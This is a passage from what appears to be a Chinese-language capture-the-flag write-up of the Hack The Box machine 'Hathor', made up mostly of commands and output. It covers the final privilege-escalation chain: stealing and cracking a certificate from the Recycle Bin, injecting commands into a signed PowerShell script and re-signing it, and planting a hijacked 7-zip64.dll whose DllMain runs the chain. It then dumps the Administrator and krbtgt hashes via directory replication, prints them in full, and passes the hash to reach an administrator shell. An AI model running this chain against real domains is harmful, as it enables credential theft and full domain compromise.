02/14/2022  08:48 PM    <DIR>          S-1-5-18
10/07/2021  12:51 AM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-2359
09/21/2026  04:09 AM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-2663
10/13/2022  09:05 PM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-500
               0 File(s)              0 bytes
               6 Dir(s)   9,352,015,872 bytes free

```

列出回收站内容，发现一个 `.pfx` 文件。

```bash
c:\share>dir /a /s C:\$Recycle.Bin
dir /a /s C:\$Recycle.Bin
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of C:\$Recycle.Bin

02/14/2022  08:48 PM    <DIR>          .
04/19/2022  02:45 PM    <DIR>          ..
02/14/2022  08:48 PM    <DIR>          S-1-5-18
10/07/2021  12:51 AM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-2359
09/21/2026  04:09 AM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-2663
10/13/2022  09:05 PM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-500
               0 File(s)              0 bytes

 Directory of C:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663

09/21/2026  04:09 AM    <DIR>          .
02/14/2022  08:48 PM    <DIR>          ..
03/21/2022  04:37 PM             4,053 $RLYS3KF.pfx
10/02/2021  09:01 PM               129 desktop.ini
               2 File(s)          4,182 bytes

     Total Files Listed:
               2 File(s)          4,182 bytes
               8 Dir(s)   9,352,015,872 bytes free
```

复制进共享文件夹。

```bash
c:\share>copy /y "C:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx" C:\share\stolen.pfx
copy /y "C:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx" C:\share\stolen.pfx
        1 file(s) copied.

c:\share>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\share

09/21/2026  11:43 AM    <DIR>          .
03/15/2018  03:17 PM         1,013,928 AutoIt3_x64.exe
09/21/2026  11:22 AM            15,360 Bginfo64.exe
03/21/2022  11:22 PM    <DIR>          scripts
03/21/2022  04:37 PM             4,053 stolen.pfx
               3 File(s)      1,033,341 bytes
               2 Dir(s)   9,351,868,416 bytes free
```

下载到 kali。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor/Nmap]
└─$ impacket-smbclient -k windcorp.htb/beatricemill@hathor.windcorp.htb                                                      
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# use share
# lcd /home/kali/Work/Kali/Hathor
/home/kali/Work/Kali/Hathor
# get stolen.pfx

```

用 pfx2john 获取 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ python3 /usr/share/john/pfx2john.py stolen.pfx > pfx.hash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ head -c 100 pfx.hash ; echo
stolen.pfx:$pfxng$1$20$2048$8$07c191a0b12e4a7c$30820f8030820a3706092a864886f70d010706a0820a2830820a2
```

用 john 破解得到密码 `abceasyas123`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash

Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
abceasyas123     (stolen.pfx)
1g 0:00:00:00 DONE (2026-09-21 05:49) 2.272g/s 139636p/s 139636c/s 139636C/s 062699..sinead1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

确认脚本的权限可写。

```bash
c:\share>icacls C:\Get-bADpasswords\Get-bADpasswords.ps1
icacls C:\Get-bADpasswords\Get-bADpasswords.ps1
C:\Get-bADpasswords\Get-bADpasswords.ps1 WINDCORP\ITDep:(I)(M)
                                         NT AUTHORITY\SYSTEM:(I)(F)
                                         BUILTIN\Administrators:(I)(F)
                                         BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
c:\share>copy /y C:\Get-bADpasswords\Get-bADpasswords.ps1 C:\share\gbp.txt

copy /y C:\Get-bADpasswords\Get-bADpasswords.ps1 C:\share\gbp.txt
        1 file(s) copied.

```

## bpassrunner

下载 gbp.txt。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ impacket-smbclient -k windcorp.htb/beatricemill@hathor.windcorp.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# use share
# lcd /home/kali/Work/Kali/Hathor
/home/kali/Work/Kali/Hathor
# get gbp.txt
```

改名。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ cp gbp.txt gbp.orig
```

脚本前插入三条语句：把身份信息写到文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ head -15 gbp.txt
 # A few helper functions
#
# Find us here:
# - https://www.improsec.com
# - https://github.com/improsec
# - https://twitter.com/improsec
# - https://www.facebook.com/improsec

# ================ #
# CONFIGURATION => #
# ================ #

# Domain information
$domain_name = "windcorp"
$naming_context = 'DC=windcorp,DC=htb'
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ tail -5 gbp.txt
# sHcB0S1PhI2O/eRosm5rGi0PGo0Ibivta1KbsqF1s6ecdCRUL71PR2cw9tR+8CxE
# 3c+VcMj8Qbh6bktI2l4Wz7UOMqy6gS3xlp29lRPK6JnwMZFDGsgzu6mhyJn/67MW
# yMFxE9W0ENJq3FG/ehjV+xSo2ybr35CozLgG0rRM17Lcony9NRYVLF/m3aJj32qY
# e+Jx
# SIG # End signature block
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ { printf 'whoami /all > C:\\Programdata\\bp-recon.txt\n'
  printf 'type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Programdata\\bp-root.txt 2>&1\n'
  printf 'C:\\share\\Bginfo64.exe\n'
  cat gbp.orig
} > gbp2.txt
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ head -6 gbp2.txt
whoami /all > C:\Programdata\bp-recon.txt
type C:\Users\Administrator\Desktop\root.txt > C:\Programdata\bp-root.txt 2>&1
C:\share\Bginfo64.exe
 # A few helper functions
#
# Find us here:
```

读取 `bp-recon.txt`。

```bash
type C:\Programdata\bp-recon.txt                                                                                06:14 [31/210]
                                                                                                                              
USER INFORMATION                                                                                                              
----------------                                                                                                              
                                                                                                                              
User Name            SID                                                                                                      
==================== ===============================================                                                          
windcorp\bpassrunner S-1-5-21-3783586571-2109290616-3725730865-10102                                                          
                                                                                                                              
                                                                                                                              
GROUP INFORMATION                                                                                                             
-----------------                                                                                                             
                                                                                                                              
Group Name                                  Type             SID                                           Attributes         
                                                                                                                              
=========================================== ================ ============================================= ===================
===============================                                                                                               
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, En
abled by default, Enabled group                                                                                               
BUILTIN\Account Operators                   Alias            S-1-5-32-548                                  Mandatory group, En
abled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, En
abled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, En
abled by default, Enabled group
NT AUTHORITY\BATCH                          Well-known group S-1-5-3                                       Mandatory group, En
abled by default, Enabled group
CONSOLE LOGON                               Well-known group S-1-2-1                                       Mandatory group, En
abled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, En
abled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, En
abled by default, Enabled group
LOCAL                                       Well-known group S-1-2-0                                       Mandatory group, En
abled by default, Enabled group
WINDCORP\Protected Users                    Group            S-1-5-21-3783586571-2109290616-3725730865-525 Mandatory group, En
abled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                      Mandatory group, En
abled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                      



PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.


```

这里的身份是 windcorp\bpassrunner。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ cat bp-dc-payload.ps1          
Import-Module DSInternals -ErrorAction SilentlyContinue
"IDENTITY: $(whoami)" | Out-File -Encoding utf8 C:\share\bp-dc.txt
Get-ADReplAccount -SamAccountName administrator -Server hathor.windcorp.htb 2>&1 | Out-File -Append -Encoding utf8 C:\share\bp-dc.txt
Get-ADReplAccount -SamAccountName krbtgt -Server hathor.windcorp.htb 2>&1 | Out-File -Append -Encoding utf8 C:\share\bp-dc.txt
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ cat bp-dc-payload.ps1 gbp.orig > gbp3.txt
                                                                                                                                            
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ head -8 gbp3.txt
Import-Module DSInternals -ErrorAction SilentlyContinue
"IDENTITY: $(whoami)" | Out-File -Encoding utf8 C:\share\bp-dc.txt
Get-ADReplAccount -SamAccountName administrator -Server hathor.windcorp.htb 2>&1 | Out-File -Append -Encoding utf8 C:\share\bp-dc.txt
Get-ADReplAccount -SamAccountName krbtgt -Server hathor.windcorp.htb 2>&1 | Out-File -Append -Encoding utf8 C:\share\bp-dc.txt
 # A few helper functions
#
# Find us here:
# - https://www.improsec.com
```

上传。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ impacket-smbclient -k windcorp.htb/beatricemill@hathor.windcorp.htb

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] CCache file is not found. Skipping...
Type help for list of commands
# use share
# lcd /home/kali/Work/Kali/Hathor
/home/kali/Work/Kali/Hathor
# put gbp3.txt
# ls gbp3.txt
-rw-rw-rw-      20704  Mon Sep 21 08:08:31 2026 gbp3.txt
```

确认是 ginawild。

```bash
PS C:\share> whoami
whoami
windcorp\ginawild
PS C:\share> Copy-Item -Path C:\share\gbp3.txt -Destination C:\Get-bADpasswords\Get-bADpasswords.ps1 -Force
Copy-Item -Path C:\share\gbp3.txt -Destination C:\Get-bADpasswords\Get-bADpasswords.ps1 -Force


```

确认是 Administrator。

```bash
PS C:\share> $pass = ConvertTo-SecureString -String 'abceasyas123' -AsPlainText -Force
$pass = ConvertTo-SecureString -String 'abceasyas123' -AsPlainText -Force
PS C:\share> $cert = Import-PfxCertificate -FilePath 'C:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx' -Password $pass -CertStoreLocation Cert:\CurrentUser\My
$cert = Import-PfxCertificate -FilePath 'C:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx' -Password $pass -CertStoreLocation Cert:\CurrentUser\My
PS C:\share> $cert | Format-List Subject,Thumbprint
$cert | Format-List Subject,Thumbprint


Subject    : CN=Administrator, CN=Users, DC=windcorp, DC=htb
Thumbprint : 204F12473FD6911584501215758270B25701D049
```

重新签名。

```bash
PS C:\share> Set-AuthenticodeSignature -FilePath C:\Get-bADpasswords\Get-bADpasswords.ps1 -Certificate $cert | Format-List Status,SignerCertificate
Set-AuthenticodeSignature -FilePath C:\Get-bADpasswords\Get-bADpasswords.ps1 -Certificate $cert | Format-List Status,SignerCertificate


Status            : Valid
SignerCertificate : [Subject]
                      CN=Administrator, CN=Users, DC=windcorp, DC=htb
                    
                    [Issuer]
                      CN=windcorp-HATHOR-CA-1, DC=windcorp, DC=htb
                    
                    [Serial Number]
                      200000000544EDAA28B636DDDC000000000005
                    
                    [Not Before]
                      3/18/2022 10:03:11 AM
                    
                    [Not After]
                      3/15/2032 10:03:11 AM
                    
                    [Thumbprint]
                      204F12473FD6911584501215758270B25701D049
```

组装 payload。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ cat bp-dc2.ps1
Import-Module DSInternals -ErrorAction SilentlyContinue
"IDENTITY: $(whoami)" | Out-File -Encoding utf8 C:\Programdata\bp-dc.txt
Get-ADReplAccount -SamAccountName administrator -Server hathor.windcorp.htb 2>&1 | Out-File -Append -Encoding utf8 C:\Programdata\bp-dc.txt
Get-ADReplAccount -SamAccountName krbtgt -Server hathor.windcorp.htb 2>&1 | Out-File -Append -Encoding utf8 C:\Programdata\bp-dc.txt
Copy-Item C:\Programdata\bp-dc.txt C:\share\bp-dc.txt -Force -ErrorAction SilentlyContinue
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ cat bp-dc2.ps1 gbp.orig > gbp5.txt
```

把整条链写进 dll。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ cat dll3.c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c copy /y C:\\share\\gbp5.txt C:\\Programdata\\gbp5.txt");
        system("cmd.exe /c copy /y C:\\Programdata\\gbp5.txt C:\\Get-bADpasswords\\Get-bADpasswords.ps1");
        system("powershell -nop -c \"$p=ConvertTo-SecureString 'abceasyas123' -AsPlainText -Force; $c=Import-PfxCertificate -FilePath 'C:\\$Recycle.Bin\\S-1-5-21-3783586571-2109290616-3725730865-2663\\$RLYS3KF.pfx' -Password $p -CertStoreLocation Cert:\\CurrentUser\\My; Set-AuthenticodeSignature -FilePath 'C:\\Get-bADpasswords\\Get-bADpasswords.ps1' -Certificate $c\"");
        system("cmd.exe /c cscript C:\\Get-bADpasswords\\run.vbs");
        Sleep(25000);
        system("cmd.exe /c copy /y C:\\Programdata\\bp-dc.txt C:\\share\\bp-dc.txt");
    }
    return TRUE;
}
```

编译。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ x86_64-w64-mingw32-gcc -shared -O2 -s -o 7-zip64.dll dll3.c

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ export KRB5CCNAME=/tmp/krb5cc_1000
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ nxc smb hathor.windcorp.htb --use-kcache --share share --put-file /home/kali/Work/Kali/Hathor/gbp5.txt '\gbp5.txt'
SMB         hathor.windcorp.htb 445    hathor           [*]  x64 (name:hathor) (domain:windcorp.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         hathor.windcorp.htb 445    hathor           [+] WINDCORP.HTB\beatricemill from ccache
SMB         hathor.windcorp.htb 445    hathor           [*] Copying /home/kali/Work/Kali/Hathor/gbp5.txt to \gbp5.txt
SMB         hathor.windcorp.htb 445    hathor           [+] Created file /home/kali/Work/Kali/Hathor/gbp5.txt on \\share\\gbp5.txt
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ nxc smb hathor.windcorp.htb --use-kcache --share share --put-file /home/kali/Work/Kali/Hathor/7-zip64.dll '\scripts\7-zip64.dll'
SMB         hathor.windcorp.htb 445    hathor           [*]  x64 (name:hathor) (domain:windcorp.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         hathor.windcorp.htb 445    hathor           [+] WINDCORP.HTB\beatricemill from ccache
SMB         hathor.windcorp.htb 445    hathor           [*] Copying /home/kali/Work/Kali/Hathor/7-zip64.dll to \scripts\7-zip64.dll
SMB         hathor.windcorp.htb 445    hathor           [+] Created file /home/kali/Work/Kali/Hathor/7-zip64.dll on \\share\\scripts\7-zip64.dll
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ cat bp-dc.txt
IDENTITY: windcorp\bpassrunner

DistinguishedName: CN=Administrator,CN=Users,DC=windcorp,DC=htb
Sid: S-1-5-21-3783586571-2109290616-3725730865-500
Guid: 526eb447-7a40-4fe9-b95a-f68e9d78efa1
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 9/21/2026 12:02:20 PM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited,
SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-3783586571-2109290616-3725730865-512
Secrets
  NTHash: b3ff8d7532eef396a5347ed33933030f
  LMHash:
  NTHashHistory:
    Hash 01: b3ff8d7532eef396a5347ed33933030f
    Hash 02: 083feb16c35174cb0f0cae63f34d5b7b
    Hash 03: 525a8625a410e103120a55684d31ca1f
  LMHashHistory:
    Hash 01: 39d3f07dfd8d05e9eff48c6934fff90a
    Hash 02: 42813ade3d911a4f3658221c38cfea58
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: a00793847320902caa206e8e1f94158a
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: 1a4cbf835bab620e
      OldCredentials:
        DES_CBC_MD5
          Key: 316dc23dadda5b32
      Salt: WINDCORP.COMAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: c5d2c64e5b14ae7da0d00e95fa826b8a1755e9901358352b0d273f3ad48bd93a
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 3a13f7631f449f83bb92de205015e619
          Iterations: 4096
        DES_CBC_MD5
          Key: 1a4cbf835bab620e
          Iterations: 4096
      OldCredentials:
        AES256_CTS_HMAC_SHA1_96
          Key: f96f29b664cfca10dd0a9ff0950fcff10cdbf95d563272e0060b2723febdb377
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: b4717ce2bf9435b3685a1f3a9f9af591
          Iterations: 4096
        DES_CBC_MD5
          Key: 316dc23dadda5b32
          Iterations: 4096
      OlderCredentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 10ccd2ca0da214cf1f45462e8b75cfaf3f4f5ff5871e9492da491d5686941447
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 47495d8390f18931a0fb506d4af2cae2
          Iterations: 4096
        DES_CBC_MD5
          Key: 015762feeafbf102
          Iterations: 4096
      ServiceCredentials:
      Salt: WINDCORP.COMAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
      Hash 01: 7f736922059914d4875c9febbf929890
      Hash 02: 0345e807081a5011149f9da4255d413f
      Hash 03: b437a8e9a6d6e7315603d4cb33d4e90c
      Hash 04: 7f736922059914d4875c9febbf929890
      Hash 05: d7d506ef3de61f6ff144005cfeb4b2d3
      Hash 06: b83fdd7207aebf8f3c920353599983e4
      Hash 07: f8c15db0e57137889e6f226ef46dee14
      Hash 08: ce84b8be199d80f17e2aca5c364e09c6
      Hash 09: 17a454845ba784c2f55b2d0e79fb2f20
      Hash 10: 9664008cc85d882b43e56df8673ea661
      Hash 11: 98505f47e364e5124de29a88d13e0fee
      Hash 12: ce84b8be199d80f17e2aca5c364e09c6
      Hash 13: 7a51ad2f1306f66f8a27b1d7b1ddf6c6
      Hash 14: 0eab9010a84cee3ce7fcbd7cb5e19f41
      Hash 15: fd54b50b868a06c8069f880a2da0f738
      Hash 16: 99727c10523f58023cff69eaaaea5454
      Hash 17: c3d16761fc1e13193e8d81997c264ab0
      Hash 18: 2c52c6f2d181050b2c184504ac54d57e
      Hash 19: 5bd1dc316750432c39c1127bf1bf15e3
      Hash 20: 95d82ee1982eac428dac558e8bbd48d3
      Hash 21: b949ed5eb5d470d4b07673ee0986810f
      Hash 22: f57c959ee6a8232154752e087b1d9c2e
      Hash 23: 60396d41e23fb72597e65f8edf7867c6
      Hash 24: a92e1051bfa7fbfa0de02c7f4943a4c9
      Hash 25: ef8322e9e4936ce94ca94a7f6c2c2d8f
      Hash 26: c1fcb77241e1891260e313dc4a3b864b
      Hash 27: 4294af5563a57060a06a3b820e1cbd7d
      Hash 28: 820dee1c6375b5da136424e30ec61412
      Hash 29: 78015edbfa85b52575a46a474ac7f97e
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:




DistinguishedName: CN=krbtgt,CN=Users,DC=windcorp,DC=htb
Sid: S-1-5-21-3783586571-2109290616-3725730865-502
Guid: 487afaeb-45ed-4443-bd52-067d89188453
SamAccountName: krbtgt
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: False
UserAccountControl: Disabled, NormalAccount
AdminCount: True
Deleted: False
LastLogonDate:
DisplayName:
GivenName:
Surname:
Description: Key Distribution Center Service Account
ServicePrincipalName: {kadmin/changepw}
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited,
SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-3783586571-2109290616-3725730865-512
Secrets
  NTHash: c639e5b331b0e5034c33dec179dcc792
  LMHash:
  NTHashHistory:
    Hash 01: c639e5b331b0e5034c33dec179dcc792
  LMHashHistory:
    Hash 01: cbbb38dfcc3a861dad4e6e9fc61e1bda
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 2c663c3c78c3c37f21aebcf8f0d3fd3b
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: 8a948ae534ce4380
      OldCredentials:
      Salt: WINDCORP.COMkrbtgt
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 3b9d1f6d2924d5e6c3ae10ad90328419b220d716cbc1c402c49cc6b909c0d2fe
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 2f3715e671440703b2317daefbac8248
          Iterations: 4096
        DES_CBC_MD5
          Key: 8a948ae534ce4380
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: WINDCORP.COMkrbtgt
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
      Hash 01: 87039b31c2219b02e254aaa78c1c13d0
      Hash 02: aeef9ae5a39b7e6c3d823da5d14765cb
      Hash 03: 27302ca2c757def9dbac2e11b375d8c8
      Hash 04: 87039b31c2219b02e254aaa78c1c13d0
      Hash 05: aeef9ae5a39b7e6c3d823da5d14765cb
      Hash 06: a006cf0b8bd1dce0489f8bd3e542a721
      Hash 07: 87039b31c2219b02e254aaa78c1c13d0
      Hash 08: ff20b356c86624658b45cfd4a97aab09
      Hash 09: ff20b356c86624658b45cfd4a97aab09
      Hash 10: 11ed562db055b124158641bf22729d0a
      Hash 11: 1d9851e0a4cb67ef00c8e1e4e7e24c56
      Hash 12: ff20b356c86624658b45cfd4a97aab09
      Hash 13: 3c55735f5d71b703892054e00b463dfc
      Hash 14: 1d9851e0a4cb67ef00c8e1e4e7e24c56
      Hash 15: 5f7fa747a085ae3f6de492d482c5fd3a
      Hash 16: 5f7fa747a085ae3f6de492d482c5fd3a
      Hash 17: 4d697f089e2b5dfca1a510111c4af64c
      Hash 18: 07840456152fdd3893975441814177e7
      Hash 19: 6dfe2432e7804bedd502478634755732
      Hash 20: 2d1e7fdca95e9c0cbe6553207e6f0b2c
      Hash 21: 4d5988ba68d546995a3e0be843c7db13
      Hash 22: 4d5988ba68d546995a3e0be843c7db13
      Hash 23: 1ad650589779388fedfbf898cd332da0
      Hash 24: f9fee840be46cf4aa1242329f2ca1401
      Hash 25: f9fee840be46cf4aa1242329f2ca1401
      Hash 26: 0abb6af6eafc25836d9d30aaee2e0546
      Hash 27: 12d764a1639347fba3c6709a48bfa669
      Hash 28: b469232d2391faf693665fed65233b71
      Hash 29: d15fc51e227c9cbcc1db931b52d49aee
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ impacket-getTGT windcorp.htb/Administrator -hashes :b3ff8d7532eef396a5347ed33933030f -dc-ip 10.129.43.31
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
                                                                                                                                                    
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ export KRB5CCNAME=$PWD/Administrator.ccache
```

登陆拿到 administrator。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ export KRB5CCNAME=/home/kali/Work/Kali/Hathor/Administrator.ccache
                                                                                                                                                    
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ impacket-wmiexec -k -no-pass windcorp.htb/Administrator@hathor.windcorp.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
whi[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
windcorp\administrator

```
